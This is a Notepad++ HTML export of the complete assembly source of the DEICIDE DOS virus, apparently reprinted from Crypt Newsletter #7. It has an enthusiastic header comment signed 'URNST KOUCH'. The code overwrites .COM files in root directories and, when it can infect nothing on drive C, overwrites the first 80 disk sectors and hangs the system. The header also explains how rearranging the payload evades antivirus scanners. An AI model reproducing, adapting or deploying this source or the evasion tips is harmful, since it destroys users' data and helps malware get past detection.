<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;***************************************************************************</span><span class="sc0">
</span><span class="sc1">; Source code of the DEICIDE Virus, original author: Glen Benton</span><span class="sc0">
</span><span class="sc1">; Assemble with A86 - Sanitized, English-ized and spruced up for inclusion</span><span class="sc0">
</span><span class="sc1">; in Crypt Newsletter #7.  The Crypt reader will also notice the</span><span class="sc0">
</span><span class="sc1">; DEICIDE listing has NO declarative red tape - no org's, no assume</span><span class="sc0">
</span><span class="sc1">; cs,ds,es stuff, no start/ends pairs or proc labels.  For the average</span><span class="sc0">
</span><span class="sc1">; reader, this means TASM and MASM will choke if you try to get them to</span><span class="sc0">
</span><span class="sc1">; assemble this as is. A86 doesn't need it, as Isaacson is fond of saying,</span><span class="sc0">
</span><span class="sc1">; and this listing can be assembled directly to a .COMfile</span><span class="sc0">
</span><span class="sc1">; without the need of a linker.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; DEICIDE virus is a kamikaze overwriting .COM infector, with a length </span><span class="sc0">
</span><span class="sc1">; of 666 bytes in its original state. With A86, you get 665 bytes, which, we</span><span class="sc0">
</span><span class="sc1">; assume ruins, the 'aesthetics' of things just a bit. (Try adding a NOP</span><span class="sc0">
</span><span class="sc1">; to the listing if this bugs you too much.) Anyway, on call DEICIDE</span><span class="sc0">
</span><span class="sc1">; jumps right to the root directory where it looks for a any .COM file</span><span class="sc0">
</span><span class="sc1">; except COMMAND.COM to infect.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; If all files are infected, and DEICIDE is not on the C drive it attempts to </span><span class="sc0">
</span><span class="sc1">; ruin it anyway. If all files in the root on C are infected, the fixed disk </span><span class="sc0">
</span><span class="sc1">; is destroyed, a message displayed and the computer hung. </span><span class="sc0">
</span><span class="sc1">; If a program is successfully overwritten, DEICIDE exits to DOS </span><span class="sc0">
</span><span class="sc1">; after displaying 'File corruption error.' If DEICIDE is trapped on</span><span class="sc0">
</span><span class="sc1">; a diskette that is write-protected, it will generate noxious 'Abort,</span><span class="sc0">
</span><span class="sc1">; Retry, Ignore, Fail' messages.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; You can work with DEICIDE quite easily by commenting out the destructive</span><span class="sc0">
</span><span class="sc1">; sequence and reassembling. Then it will merely mess up .COM's in</span><span class="sc0">
</span><span class="sc1">; your root directory. If you forget that you're using NDOS or 4DOS, DEICIDE</span><span class="sc0">
</span><span class="sc1">; will promptly foul your command processor and the operating system</span><span class="sc0">
</span><span class="sc1">; won't load properly when you reboot. In an interesting side note, </span><span class="sc0">
</span><span class="sc1">; removing the destructive payload of DEICIDE causes SCAN to lose sight of</span><span class="sc0">
</span><span class="sc1">; DEICIDE. (There's a simple poor man's method to a 'new' strain. Fool</span><span class="sc0">
</span><span class="sc1">; your friends who think you've written a virus from scratch.)</span><span class="sc0">
</span><span class="sc1">; The DEBUG script of DEICIDE has the destructive payload "rearranged" and</span><span class="sc0">
</span><span class="sc1">; is not, strictly speaking, identical to this listing. This has made</span><span class="sc0">
</span><span class="sc1">; that copy of DEICIDE (referred to in the scriptfile as DEICIDE2) </span><span class="sc0">
</span><span class="sc1">; functionally similar to the original, but </span><span class="sc0">
</span><span class="sc1">; still invisible to SCAN v85b and a number of other commercial products.</span><span class="sc0">
</span><span class="sc1">; The lesson to be learned here is that software developers shouldn't choose</span><span class="sc0">
</span><span class="sc1">; generic disk overwriting payloads as signatures for their scanners.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; I must confess I'm fascinated by the mind that went into creating DEICIDE.</span><span class="sc0">
</span><span class="sc1">; Even in 1990, the DEICIDE was more of a 'hard disk bomb' than a virus.</span><span class="sc0">
</span><span class="sc1">; Think a moment. How many files are in your root directory? How long before</span><span class="sc0">
</span><span class="sc1">; this sucker activated and spoiled your afternoon? Once? Twice? In</span><span class="sc0">
</span><span class="sc1">; any case, it still is an easily understood piece of code, enjoying its</span><span class="sc0">
</span><span class="sc1">; own unique charm. Enjoy looking at DEICIDE. Your virus pal, URNST KOUCH.</span><span class="sc0">
</span><span class="sc1">;***************************************************************************</span><span class="sc0">

</span><span class="sc5">Start_Prog</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Start_Virus</span><span class="sc0">
                </span><span class="sc6">nop</span><span class="sc0">

</span><span class="sc5">Message</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc4">,</span><span class="sc12">'DEICIDE!'</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc4">,</span><span class="sc12">'Glenn (666) says : BYE BYE HARDDISK!!'</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc4">,</span><span class="sc12">'Next time be carufull with illegal stuff......$'</span><span class="sc0">

</span><span class="sc5">Start_Virus</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">19h</span><span class="sc0">                      </span><span class="sc1">; Get actual drive</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0A2h</span><span class="sc0">                         </span><span class="sc1">; Mov [EA],al</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Infect_Drive</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0A2h</span><span class="sc0">                     </span><span class="sc1">; A86 assembles this differently</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Actual_Drive</span><span class="sc0">      </span><span class="sc1">; so put the original code here</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">47h</span><span class="sc0">                 </span><span class="sc1">; Get actual directory</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Actual_Dir</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1Ah</span><span class="sc0">                 </span><span class="sc1">; stash DTA in safe place</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">New_DTA</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc5">Infect_Next</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Bh</span><span class="sc0">                 </span><span class="sc1">; DOS chdir function, go to root dir</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Root_Dir</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4Eh</span><span class="sc0">                 </span><span class="sc1">; Search first .COM file</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Search_Path</span><span class="sc0">  </span><span class="sc1">; using file mask</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc5">Check_Command</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'D'</span><span class="sc0">         </span><span class="sc1">; Check if 7th char is a 'D' (To prevent</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">New_DTA</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">       </span><span class="sc1">; infecting COMMAND.COM, causing </span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">Check_Infect</span><span class="sc0">           </span><span class="sc1">; noticeable boot failure)</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Search_Next</span><span class="sc0">
                </span><span class="sc6">nop</span><span class="sc0">

</span><span class="sc5">Check_Infect</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Dh</span><span class="sc0">             </span><span class="sc1">; Open found file with write access</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">New_DTA</span><span class="sc4">+</span><span class="sc2">1Eh</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">File_Handle</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">              </span><span class="sc1">; Save handle</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">57h</span><span class="sc0">                      </span><span class="sc1">; Get date/time of file</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                        </span><span class="sc1">; why, for Heaven's sake?</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">File_Date</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">File_Time</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Go_Beg_File</span><span class="sc0">                </span><span class="sc1">; Go to beginning of file</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">                      </span><span class="sc1">; Read first 2 bytes</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Read_Buf</span><span class="sc0">          </span><span class="sc1">; into a comparison buffer</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Read_Buf</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; now, take a look at the</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Start_Virus</span><span class="sc4">-</span><span class="sc2">102h</span><span class="sc0"> </span><span class="sc1">; buffer and the start of</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">Infect</span><span class="sc0">                     </span><span class="sc1">; DEICIDE. Is it the</span><span class="sc0">
                                               </span><span class="sc1">; jump? If not, infect file</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">                  </span><span class="sc1">; Already infected, so close file</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc5">Search_Next</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4Fh</span><span class="sc0">                  </span><span class="sc1">; Search next file function</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">Check_Command</span><span class="sc0">           </span><span class="sc1">; No error - try this file</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">Infect_Drive</span><span class="sc0">         </span><span class="sc1">; Skip to next drive,</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                     
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">No_A_Drive</span><span class="sc0">               
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
</span><span class="sc5">No_A_Drive</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                   </span><span class="sc1">; Is the drive C:?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">No_Destroy</span><span class="sc0">             </span><span class="sc1">; </span><span class="sc0">
                                           </span><span class="sc1">; if it is and haven't been</span><span class="sc0">
                                           </span><span class="sc1">; able to infect</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                   </span><span class="sc1">; Overwrite first 80 sectors, </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                   </span><span class="sc1">; BUMMER!</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">50h</span><span class="sc0">                 </span><span class="sc1">; BUMMER!</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                   </span><span class="sc1">; BUMMER!</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">26h</span><span class="sc0">                    </span><span class="sc1">; BUMMER!</span><span class="sc0">
                
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">                   </span><span class="sc1">; Show silly message </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Message</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
                

</span><span class="sc5">Lock_System</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Lock_System</span><span class="sc0">  </span><span class="sc1">; lock up the system so the poor fool</span><span class="sc0">
                                     </span><span class="sc1">; has to start reloading right away </span><span class="sc0">
</span><span class="sc5">No_Destroy</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                          </span><span class="sc1">; New actual drive</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0Eh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">Infect_Drive</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">                </span><span class="sc1">; Save drive number.</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Infect_Next</span><span class="sc0">

</span><span class="sc5">Infect</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Go_Beg_File</span><span class="sc0">          </span><span class="sc1">;call seek routine</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                </span><span class="sc1">; Write DEICIDE to the file</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">End_Virus</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc0">  </span><span class="sc1">;right over the top, starting</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">               </span><span class="sc1">; at the beginning, thus messing</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                   </span><span class="sc1">; up everything</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">57h</span><span class="sc0">                      </span><span class="sc1">; Restore date/time of file</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                        </span><span class="sc1">; why, for God's sake? You </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">File_Time</span><span class="sc0">                </span><span class="sc1">; think no one will notice</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">File_Date</span><span class="sc0">                </span><span class="sc1">; file is destroyed?</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">                       </span><span class="sc1">; Close file, let's be neat</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Actual_Drive</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Back to original drive</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0Eh</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Bh</span><span class="sc0">                       </span><span class="sc1">; And original dir</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Actual_Dir</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">                      </span><span class="sc1">; Show 'File corruption error.'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Quit_Message</span><span class="sc0">    </span><span class="sc1">; when destroyed, infected </span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                       </span><span class="sc1">; program misfires and DEICIDE</span><span class="sc0">
                                          </span><span class="sc1">; executes so user may be placated</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">                   </span><span class="sc1">; Exit back to DOS</span><span class="sc0">

</span><span class="sc5">Go_Beg_File</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">42h</span><span class="sc0">                </span><span class="sc1">; Procedure: seek to start of file</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">File_Date</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">File_Time</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">File_Handle</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">Infect_Drive</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">Root_Dir</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc13">'\',0
</span><span class="sc0">
</span><span class="sc5">Search_Path</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'*.COM'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">Read_Buf</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">Actual_Drive</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">


</span><span class="sc5">Quit_Message</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'File corruption error.'</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc4">,</span><span class="sc12">'$'</span><span class="sc0">

</span><span class="sc5">New_DTA</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">2Bh</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">Actual_Dir</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'This experimental virus was written by Glenn Benton to '</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'see if I can make a virus while learning machinecode for '</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'2,5 months. (C) 10-23-1990 by Glenn. I keep on going '</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'making virusses.'</span><span class="sc0">

</span><span class="sc5">End_Virus</span><span class="sc4">:</span><span class="sc0">

</span></div></body>
</html>
